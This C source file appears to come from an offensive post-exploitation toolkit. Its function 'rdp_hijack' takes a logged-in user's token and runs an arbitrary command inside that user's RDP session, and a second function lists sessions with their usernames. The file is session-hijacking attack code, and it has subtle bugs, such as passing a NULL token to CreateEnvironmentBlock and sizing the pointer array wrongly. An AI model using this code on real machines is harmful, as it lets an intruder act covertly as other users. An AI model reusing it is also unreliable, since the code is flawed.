#include "lua_mirv_extensions.h"

int rdp_hijack(ULONG sessionid, char *cmdline){
	HANDLE server;
	PWTS_SESSION_INFOA ppSessionInfo=NULL;

	DWORD pLevel=1;
	DWORD i=0;
	LPSTR ppBuffer;
	DWORD bytesReturned;	
	HANDLE userToken=NULL;
	HANDLE pUserToken=NULL;
	DWORD dwCreationFlags=0;
	LPVOID environment=NULL;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	char *username;
	char *homedir;//[MAX_PATH];
	server=WTSOpenServerA(WTS_CURRENT_SERVER_NAME);

	if(WTSQueryUserToken(sessionid,&userToken)){

		if(CreateEnvironmentBlock(&environment,pUserToken,FALSE)){
			ZeroMemory( &si, sizeof( STARTUPINFO ) );

			si.lpDesktop = "winsta0\\default";;
			si.cb=sizeof(STARTUPINFO);
			ZeroMemory( &pi,sizeof(pi));
			WTSQuerySessionInformationA(server,sessionid,WTSUserName,&ppBuffer,&bytesReturned);

			username=_strdup(ppBuffer);
			WTSFreeMemory(ppBuffer);

			homedir=(char *)malloc(MAX_PATH);
			//FIXME: get a better homedir
			sprintf_s(homedir,MAX_PATH,"C:\\");		
			dwCreationFlags|= CREATE_UNICODE_ENVIRONMENT | NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;


			if(CreateProcessAsUserA(userToken,
				NULL,
				cmdline,
				//buf,
				NULL,
				NULL,
				FALSE,
				dwCreationFlags,
				environment,
				homedir,
				&si,
				&pi)){
					return pi.dwProcessId;
			}else{
				return 0;
			}



		}else{
			return 0;
		}


	}
	else{
		return 0;
	}
}
int get_rdp_sessions(struct rdp_sessions_struct ***sessions){
	HANDLE server;
	PWTS_SESSION_INFOA ppSessionInfo=NULL;
	WTS_SESSION_INFOA pSessionInfo;
	DWORD pCount;
	DWORD i;
	LPSTR ppBuffer;
	DWORD bytesReturned;
	struct rdp_sessions_struct **tmpsessions;

	server=WTSOpenServerA(WTS_CURRENT_SERVER_NAME);
	if(WTSEnumerateSessionsA(server,0,1,&ppSessionInfo,&pCount)){
		tmpsessions=(struct rdp_sessions_struct**) malloc(sizeof(struct rdp_sessions_struct)*pCount);
		ZeroMemory(tmpsessions,sizeof(struct rdp_sessions_struct)*pCount);
		for (i=0;i<pCount;++i){
			tmpsessions[i]=(struct rdp_sessions_struct *) malloc(sizeof(struct rdp_sessions_struct));
			tmpsessions[i]->id=i;
			pSessionInfo=ppSessionInfo[i];
			if(WTSQuerySessionInformationA(server,pSessionInfo.SessionId,WTSUserName,&ppBuffer,&bytesReturned)){
				tmpsessions[i]->user=_strdup(ppBuffer);
				WTSFreeMemory(ppBuffer);
			}else{
				return -1;
			}
			if(WTSQuerySessionInformationA(server,pSessionInfo.SessionId,WTSWinStationName,&ppBuffer,&bytesReturned)){
				tmpsessions[i]->station=_strdup(ppBuffer);
				WTSFreeMemory(ppBuffer);
			}else{
			}
		}
		WTSFreeMemory(ppSessionInfo);
		*sessions=tmpsessions;
		return pCount;
	}else 
	{
		return -1;
	}
}